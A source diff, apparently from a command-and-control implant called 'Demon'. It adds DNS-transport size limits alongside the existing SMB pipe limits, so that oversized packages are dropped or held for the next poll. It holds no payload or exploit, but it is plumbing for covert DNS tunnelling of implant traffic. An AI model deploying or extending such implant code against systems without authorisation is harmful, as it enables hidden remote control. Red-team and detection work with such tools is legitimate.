@@ -289,29 +289,37 @@ VOID PackageTransmit(
         return;
     }
 
-#if TRANSPORT_SMB
-        // if the package is larger than PIPE_BUFFER_MAX, discard it
-        // TODO: support packet fragmentation
+#if defined( TRANSPORT_SMB ) || defined( TRANSPORT_DNS )
+    // if the package is larger than the transport max, discard it
+    // TODO: support packet fragmentation
 
-        // size + demon-magic + agent-id + command-id + request-id +
-        // command-id + request-id + buffer-size + Package->Length
-        if ( sizeof( UINT32 ) * 8 + Package->Length > PIPE_BUFFER_MAX )
-        {
-            PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than PIPE_BUFFER_MAX, discarding...\n", Package->Length )
+    // size + demon-magic + agent-id + command-id + request-id +
+    // command-id + request-id + buffer-size + Package->Length
+#ifdef TRANSPORT_DNS
+    #define TRANSPORT_MAX_PACKAGE DNS_MAX_REQUEST_LENGTH
+#else
+    #define TRANSPORT_MAX_PACKAGE PIPE_BUFFER_MAX
+#endif
 
-            RequestID = Package->RequestID;
-            Length    = Package->Length;
+    if ( sizeof( UINT32 ) * 8 + Package->Length > TRANSPORT_MAX_PACKAGE )
+    {
+        PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than 0x%x, discarding...\n", Package->Length, TRANSPORT_MAX_PACKAGE )
 
-            // destroy the package
-            if ( Package->Destroy ) {
-                PackageDestroy( Package );
-            }
+        RequestID = Package->RequestID;
+        Length    = Package->Length;
 
-            // notify the operator that a package was discarded
-            Package = PackageCreateWithRequestID( DEMON_PACKAGE_DROPPED, RequestID );
-            PackageAddInt32( Package, Length );
-            PackageAddInt32( Package, PIPE_BUFFER_MAX );
+        // destroy the package
+        if ( Package->Destroy ) {
+            PackageDestroy( Package );
         }
+
+        // notify the operator that a package was discarded
+        Package = PackageCreateWithRequestID( DEMON_PACKAGE_DROPPED, RequestID );
+        PackageAddInt32( Package, Length );
+        PackageAddInt32( Package, TRANSPORT_MAX_PACKAGE );
+    }
+
+    #undef TRANSPORT_MAX_PACKAGE
 #endif
 
     if ( ! Instance->Packages )
@@ -357,6 +365,13 @@ BOOL PackageTransmitAll(
 #if TRANSPORT_SMB
         // SMB pivots can't send packages greater than PIPE_BUFFER_MAX
         if ( Package->Length + sizeof( UINT32 ) * 3 + Pkg->Length > PIPE_BUFFER_MAX )
+            break;
+#endif
+
+#ifdef TRANSPORT_DNS
+        // Keep each DNS message inside the teamserver reassembly limit. Any
+        // package that does not fit stays queued for the next poll.
+        if ( Package->Length + sizeof( UINT32 ) * 3 + Pkg->Length > DNS_MAX_REQUEST_LENGTH )
             break;
 #endif
 
